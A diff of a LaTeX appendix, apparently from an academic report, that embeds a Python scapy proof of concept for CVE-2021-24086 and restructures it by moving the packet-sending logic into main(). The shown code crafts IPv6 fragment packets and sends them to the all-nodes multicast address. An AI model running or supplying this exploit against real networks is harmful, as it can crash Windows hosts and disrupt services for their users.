@@ -5,7 +5,6 @@
 \begin{document}
 
 \section*{\glsentrytext{POC} for CVE-2021-24086}
-\todo{Rewrite PoC to remove "known" code. Should be easy}
 \label{appendix:poc}
 \begin{minted}[breaklines, linenos, breakanywhere]{python}
 from scapy.all import *
@@ -34,7 +33,12 @@ def custom_fragment6(target, frag_id, bytes, nh, frag_size = 1008):
         frags.append(pkt)
     return frags
 
-def exploit(args):
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--target', default = 'ff02::1')
+    parser.add_argument('--iface', default = 'eth1')
+    args = parser.parse_args()
+
     first_fragment_id = random.randint(0, 0xffffffff)
     second_fragment_id = random.randint(0, 0xffffffff)
 
@@ -79,14 +83,6 @@ def exploit(args):
     packet2 = Ether() / IPv6(dst = args.target) / IPv6ExtHdrFragment(id = second_fragment_id, m = 0, offset = 1, nh = 17) / 'fritzboger' # dummy data
 
     sendp(packet2, iface = args.iface)
-
-def main():
-    parser = argparse.ArgumentParser()
-    parser.add_argument('--target', default = 'ff02::1')
-    parser.add_argument('--iface', default = 'eth1')
-    args = parser.parse_args()
-
-    exploit(args)
     
     return
 
